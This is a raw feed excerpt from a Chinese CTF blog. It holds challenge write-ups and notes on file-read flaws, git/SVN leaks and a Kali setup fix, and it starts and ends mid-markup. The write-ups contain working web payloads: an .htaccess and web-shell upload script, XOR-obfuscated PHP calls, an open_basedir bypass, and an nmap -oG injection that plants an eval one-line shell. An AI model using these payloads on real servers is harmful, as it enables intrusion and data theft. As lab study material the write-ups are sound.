&quot;http://f6dac892-28e5-4eca-be9e-c88ab2549805.node3.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&quot;files = &#123;&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess,&#x27;image/jpeg&#x27;)&#125;data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;&#x27;file&#x27;:(&#x27;shell.abc&#x27;,shell,&#x27;image/jpeg&#x27;)&#125;response = requests.post(url=url, data=data, files=files)print(response.text)</span><br></pre></td></tr></table></figure><p>发现存在open_basedir和disable_functions的限制</p><p><a href="https://xz.aliyun.com/t/4720">bypass open_basedir</a></p><p>最后的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.dazhuanlan.com/2019/12/17/5df803f62c08a/">https://www.dazhuanlan.com/2019/12/17/5df803f62c08a/</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;CISCN2019-华东南赛区-Web11&quot;&gt;&lt;a href=&quot;#CISCN2019-华东南赛区-Web11&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华东南赛区]Web11&quot;&gt;&lt;/a&gt;[CISCN2019 华东南赛区]Web11&lt;/h3&gt;&lt;p&gt;最后一行提示smarty&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>kali</title>
    <link href="http://example.com/2021/04/24/kali/"/>
    <id>http://example.com/2021/04/24/kali/</id>
    <published>2021-04-24T07:09:40.000Z</published>
    <updated>2021-05-23T01:35:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>   <em><strong>其实安装失败的原因很简单，安装kali需要有网络配置，没有网络无法成功安装操作系统。</strong></em></p><p><em><strong>我没有网络的原因是DHCP服务没开启，去虚拟机看了一下虚拟网络的设置，都是打开着DHCP服务，最后解决办法是：</strong></em></p><p><em><strong>到任务管理器找到vm相关网络服务，都开启即可，完成网络配置。</strong></em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;   &lt;em&gt;&lt;strong&gt;其实安装失败的原因很简单，安装kali需要有网络配置，没有网络无法成功安装操作系统。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;我没有网络的原因是DHCP服务没开启，去虚拟机看了一下虚拟网络的设置，都是打开着DHCP服务</summary>
      
    
    
    
    
    <category term="kali网络配置问题" scheme="http://example.com/tags/kali%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>ctf之任意文件读取漏洞总结</title>
    <link href="http://example.com/2021/04/19/ctf%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/04/19/ctf%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-19T12:45:02.000Z</published>
    <updated>2021-07-27T01:52:00.714Z</updated>
    
    <content type="html"><![CDATA[<p>   下面是对任意文件漏洞读取的简单总结：</p><span id="more"></span><h3 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h3><h4 id="相关web语言"><a href="#相关web语言" class="headerlink" title="相关web语言"></a>相关web语言</h4><h5 id="1、php"><a href="#1、php" class="headerlink" title="1、php"></a>1、php</h5><p><em><strong>如</strong></em></p><p><em><strong>文件读取函数：</strong></em></p><p><em><strong>file_get_contents()、file()、fopen()、 fread()、 fgets()、 readline()等等</strong></em></p><p><em><strong>文件包含相关函数：</strong></em></p><p><em><strong>include、require、include_once、require_once</strong></em></p><p><em><strong>通过php读文件的执行系统命令：</strong></em></p><p><em><strong>system、exec</strong></em></p><p><em><strong>还有php伪协议读取文件</strong></em></p><h5 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h5><p><em><strong>如</strong></em></p><p><em><strong>os.path.join()函数</strong></em></p><h5 id="3、java"><a href="#3、java" class="headerlink" title="3、java"></a>3、java</h5><p><em><strong>FileInputStream函数、XXE导致的文件读取，java一些模块也支持file://协议，在CTF很常见。</strong></em></p><h5 id="4、Ruby"><a href="#4、Ruby" class="headerlink" title="4、Ruby"></a>4、Ruby</h5><p><em><strong>与Rails框架相关</strong></em></p><h5 id="5、Node"><a href="#5、Node" class="headerlink" title="5、Node"></a>5、Node</h5><p><em><strong>Node.js的express模块。</strong></em></p><h4 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h4><h4 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h4><p><em><strong>/etc/目录</strong></em></p><p><em><strong>/etc/passwd</strong></em></p><p><em><strong>/etc/shadow</strong></em></p><p><em><strong>等等</strong></em></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;   下面是对任意文件漏洞读取的简单总结：&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ctf之信息收集总结</title>
    <link href="http://example.com/2021/04/18/ctf%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2021/04/18/ctf%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-04-18T12:32:14.000Z</published>
    <updated>2021-07-27T01:54:59.624Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h2><h3 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h3><h4 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h4><h5 id="git常规泄露"><a href="#git常规泄露" class="headerlink" title="git常规泄露"></a>git常规泄露</h5><p>工具：</p><p><a href="https://github.com/denny0223/scrabble">https://github.com/denny0223/scrabble</a></p><span id="more"></span><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrabble url</span><br></pre></td></tr></table></figure><h5 id="git回滚"><a href="#git回滚" class="headerlink" title="git回滚"></a>git回滚</h5><p><em><strong>git作为一个版本控制工具，会记录每次提交(commit)的修改，存在git泄露时，flag可能在修改中被删除，可以使用<code>git reset</code></strong></em></p><p><em><strong>先得源码，后使用<code>git reset --hard HEAD^</code></strong></em></p><p><em><strong>命令跳到上一个版本。(HEAD表示当前版本，HEAD^表示上一个版本)</strong></em></p><p><em><strong>还可以使用<code>git log -stat</code></strong></em></p><p><em><strong>命令查看每一个commit修改了哪些文件，再用</strong></em></p><p><em><strong><code>git diff HEAD commit-id</code></strong></em></p><p><em><strong>比较在当前版本与想查看得commit之间的变化。</strong></em></p><h5 id="git分支"><a href="#git分支" class="headerlink" title="git分支"></a>git分支</h5><p><em><strong>每次提交时，git都会自动把它们串成一条时间线，这条就是一个分支。git允许使用多个分支，如果没有新建分支，那么只有一条时间线，默认master分支。</strong></em></p><p><em><strong>使用<code>git log</code></strong></em></p><p><em><strong>只能查看当前的分支修改，所以引入之前常用的GitHacker。</strong></em></p><p><em><strong>进入githack生成的文件夹，执行</strong></em></p><p><em><strong><code>git log --all</code>或</strong></em></p><p><em><strong><code>git branch -v</code></strong></em></p><p><em><strong>只能查看master分支，需要执行</strong></em></p><p><em><strong><code>git reflog</code></strong></em></p><p><em><strong>就能看见一些checkout的记录。</strong></em></p><p><em><strong>假如还有一个分支，我们需要手动下载这个分支的head信息，保存到</strong></em></p><p> <em><strong>.git/refs/heads/其他分支名</strong></em></p><p><em><strong>恢复heads信息后，我们使用GitHacker的部分代码，以实现自动恢复分支的效果。</strong></em></p><p><em><strong>使用的是： <a href="https://github.com/WangYihang/GitHacker">https://github.com/WangYihang/GitHacker</a></strong></em></p><p><em><strong>在GitHacker的代码中，先下载ojbect文件，再使用git fsck检测，并继续下载缺失的文件。</strong></em></p><p><em><strong>修改代码如下：</strong></em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span></span><br><span class="line"><span class="comment"># main()</span></span><br><span class="line">baseurl=complete_url(<span class="string">&#x27;http://127.0.0.1:8000/.git/&#x27;</span>)</span><br><span class="line">temppath=replace_bad_chars(get_prefix(baseurl))</span><br><span class="line">fixmissing(baseurl,temppath)</span><br></pre></td></tr></table></figure><p><em><strong>修改后运行，再次进入文件夹，执行</strong></em></p><p><em><strong><code>git log --all</code></strong></em></p><p><em><strong>或<code>git branch -v </code></strong></em></p><p><em><strong>即可恢复。</strong></em></p><p><em><strong>其他的利用：.git/config文件夹中可能含有access_token 信息，从而通过访问这个用户的其他仓库。</strong></em></p><h4 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h4><p><em><strong>SVN是源代码版本管理软件，造成SVN源代码漏洞主要原因是管理员操作不规范将SVN隐藏文件夹暴露于外网环境，可以利用.svn/entries或wc.db文件获得服务器源码，推荐使用两个工具：</strong></em></p><p><em><strong><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></strong></em></p><p><em><strong>还有 Seay-svn</strong></em></p><h4 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h4><p><em><strong>.hg</strong></em></p><p><em><strong>工具：</strong></em></p><p><em><strong><a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></strong></em></p><p><em><strong>以上的源码泄露，可以直接使用目录扫描工具：</strong></em></p><p><em><strong><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></strong></em></p><p><em><strong>有可能存在重定向一类问题，访问.git返回403，访问.git/config，如果有文件返回，说明存在.git泄露。</strong></em></p><p><em><strong>在SVN泄露，一般是在entries中爬取源代码，但有时为空，注意wc.db文件存在与否，便可通过其中的checksum在pristine文件夹中获取源代码。</strong></em></p><h3 id="敏感备份文件"><a href="#敏感备份文件" class="headerlink" title="敏感备份文件"></a>敏感备份文件</h3><h4 id="1、gedit备份文件"><a href="#1、gedit备份文件" class="headerlink" title="1、gedit备份文件"></a>1、gedit备份文件</h4><p><em><strong>在Linux下，用gedit编辑器保存后，当前目录会生成一个后缀为“<del>”的文件，访问带有</del>的文件，得到flag。</strong></em></p><h4 id="2、vim备份文件"><a href="#2、vim备份文件" class="headerlink" title="2、vim备份文件"></a>2、vim备份文件</h4><p><em><strong>vim是当前linux运行最多的linux编辑器，如果遇到卡死意外退出，会生成一个备份文件，</strong></em></p><p><em><strong>.flag.swp</strong></em></p><p><em><strong>使用命令 <code>vim -r</code></strong></em></p><p><em><strong>恢复文件内容，要先生成flag文件，再恢复文件。</strong></em></p><p><em><strong><code>vim flag</code></strong></em></p><p><em><strong><code>vim -r flag</code></strong></em></p><h4 id="3、常规文件"><a href="#3、常规文件" class="headerlink" title="3、常规文件"></a>3、常规文件</h4><p><em><strong>robots.txt:记录一些目录和CMS版本信息。</strong></em></p><p><em><strong>readme.txt:记录CMS版本信息，甚至有Github地址。</strong></em></p><p><em><strong><a href="http://www.zip/rar/tar.gz:%E5%BE%80%E5%BE%80%E6%98%AF%E7%BD%91%E7%AB%99%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD">www.zip/rar/tar.gz:往往是网站的源码备份</a></strong></em></p><p><em><strong>以上特殊的关键字，我们可以构造成一个字典，后续用burp进行爆破。</strong></em></p><h3 id="Banner识别"><a href="#Banner识别" class="headerlink" title="Banner识别"></a>Banner识别</h3><p>Banner信息：服务器对外显示的一些基础信息</p><p>1、自行收集指纹库</p><p>github上有大量成型且公开的CMS指纹库，借鉴一些成型扫描器对网站进行识别。</p><p>2、使用已有工具</p><p><strong>Wappalyzer工具</strong></p><p>除了使用工具，还可以随意输入一些参数，可能会出现404或302跳转出一些信息。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;web入门&quot;&gt;&lt;a href=&quot;#web入门&quot; class=&quot;headerlink&quot; title=&quot;web入门&quot;&gt;&lt;/a&gt;web入门&lt;/h2&gt;&lt;h3 id=&quot;敏感目录泄露&quot;&gt;&lt;a href=&quot;#敏感目录泄露&quot; class=&quot;headerlink&quot; title=&quot;敏感目录泄露&quot;&gt;&lt;/a&gt;敏感目录泄露&lt;/h3&gt;&lt;h4 id=&quot;git泄露&quot;&gt;&lt;a href=&quot;#git泄露&quot; class=&quot;headerlink&quot; title=&quot;git泄露&quot;&gt;&lt;/a&gt;git泄露&lt;/h4&gt;&lt;h5 id=&quot;git常规泄露&quot;&gt;&lt;a href=&quot;#git常规泄露&quot; class=&quot;headerlink&quot; title=&quot;git常规泄露&quot;&gt;&lt;/a&gt;git常规泄露&lt;/h5&gt;&lt;p&gt;工具：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/denny0223/scrabble&quot;&gt;https://github.com/denny0223/scrabble&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buu2</title>
    <link href="http://example.com/2021/04/07/buu2/"/>
    <id>http://example.com/2021/04/07/buu2/</id>
    <published>2021-04-07T12:10:08.000Z</published>
    <updated>2021-07-27T01:43:37.932Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>下载源码，解压一下，那么多php文件，怎么看的过来，感觉应该要用脚本处理了。</p><span id="more"></span><p>写脚本能力还不行，这里应该是设计了一句话木马，看一下wp。</p><p><a href="https://blog.csdn.net/RABCDXB/article/details/115256974">这里就参考大佬的脚本</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))   <span class="comment">#只是一个简单的时间函数，看起来更漂亮罢了</span></span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)                               <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/phpstudy_pro/WWW/test1/&quot;</span></span><br><span class="line">os.chdir(filePath)                                     <span class="comment">#改变当前的路径，这个还是不太懂</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                       <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)                                            <span class="comment">#得到该目录下所有文件的名称</span></span><br><span class="line">session = requests.Session()                                        <span class="comment">#得到session()为之后的实现代码回显得取创造条件</span></span><br><span class="line">session.keep_alive = <span class="literal">False</span>                                <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()                                                       <span class="comment">#好像与锁什么的相关，但是还是不太懂，多线程开启</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))  <span class="comment">#更好看，同时可以对比不加线程和加线程的时间对比</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                   <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;                                         <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;                                           <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/test1/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)        <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()                                     <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:                            <span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()                                     <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()                                     <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                                      <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()                <span class="comment">#对应于之前的多线程打开</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:                                              <span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>代码审计一下，有两个新鲜函数escapeshellarg()，escapeshellcmd()。</strong></p><p>关于这两个函数绕过可以看看：</p><p><a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><p><a href="https://www.baidu.com/link?url=hmHQm0WU4_sK19NtydFvnEzmDDW5WzkovBOKKimBjt2L0REY6lyxRsoczpN1x-kzhT0sH2xZy-r11RPlMZVZMX6WdBwaXcOFPJfPjE27_pNkutAqNaCo1xWISD_oF9Xr&amp;wd=&amp;eqid=ea0fc88a0002d3fc00000006606dc09d">https://www.baidu.com/link?url=hmHQm0WU4_sK19NtydFvnEzmDDW5WzkovBOKKimBjt2L0REY6lyxRsoczpN1x-kzhT0sH2xZy-r11RPlMZVZMX6WdBwaXcOFPJfPjE27_pNkutAqNaCo1xWISD_oF9Xr&amp;wd=&amp;eqid=ea0fc88a0002d3fc00000006606dc09d</a></p><p><a href="https://blog.csdn.net/weixin_44348894/article/details/105520481">https://blog.csdn.net/weixin_44348894/article/details/105520481</a></p><p>两个函数共同使用会导致字符串逃逸。</p><p>代码最后一行有个system，我们可以构造payload传到这个命令中，这里还要知道nmap命令中，参数-oG可以实现将命令和结果写到文件。</p><p>构造payload：</p><p><code>?host=&#39; &lt;?php @eval($_POST[1]);?&gt; -oG 1.php &#39;</code></p><p>这两边留空格，如果不留空格，执行后的语句会变成：</p><p><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code></p><p>还可以写payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG 1.php &#x27;</span></span><br></pre></td></tr></table></figure><p>反引号执行命令。</p><p>绕过主要还是看这两个函数的特性，最后还有一个nmap写入命令的语法。</p><p><strong>本题关键：两个函数有顺序配合造成漏洞，nmap命令写入，反引号可以执行命令。</strong></p><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><p>f12查看源码，访问+文件名，下载了一个word文档，内容：Are you sure the flag is here? ? ?</p><p>继续看一下网页，点击help，url有个filename参数，应该可以构造什么注入。</p><p>可以用来下载文件。</p><p>这里尝试一下下载flag.docx，没有这个文件。但是泄露了版本，这里应该跟访问文件目录有关系。</p><p><img src="buu2/1.png"></p><p>对于java的了解比较少，看一下wp。</p><p>了解一下源码泄露的利用办法：</p><p>参考：<a href="https://blog.csdn.net/wy_97/article/details/78165051">https://blog.csdn.net/wy_97/article/details/78165051</a></p><p>了解到WEB-INF是java的web应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p><p>WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p><p>​         </p><pre><code>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</code></pre><p>​         </p><pre><code>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</code></pre><p>​         </p><pre><code>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</code></pre><p>​         </p><pre><code>/WEB-INF/database.properties：数据库配置文件</code></pre><p>flag文件应该在classes目录。</p><p>开始测试，我的hackbar比较low，不能直接该post型，使用burp。</p><p>这里的意思不是让我们提交的数据以post方式提交。</p><p>先访问/WEB-INF/web.xml来找到flag位置。</p><p><img src="buu2/2.png"></p><p>然后反编译(其实就是把.换成/)，得到payload:</p><p><img src="buu2/3.png"></p><p>得到base64编码，解码得到flag。</p><p><strong>本题关键：主要是对java的web应用的安全目录一个了解，后续还有很多不同语言的框架需要学习。</strong></p><h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>知道是.htaccess文件上传，先上传一个内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>该语句作用是让<strong>Apache</strong>将其他类型文件均以php格式解析。</p><p>这里上传jpg后缀的文件会导致上传失败，只能使用gif或png后缀上传，但是文件类型又需要的是image/jpeg。</p><p><strong>本题关键：.htaccess文件上传</strong></p><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>git源码泄露，使用工具，githack，之前用的那个一直报错，换了一个。</p><p>下载地址</p><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>输入<code>GitHack.py http://0512f6df-b60e-4405-b403-7db5f19a622e.node3.buuoj.cn/.git/</code></p><p>得到源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 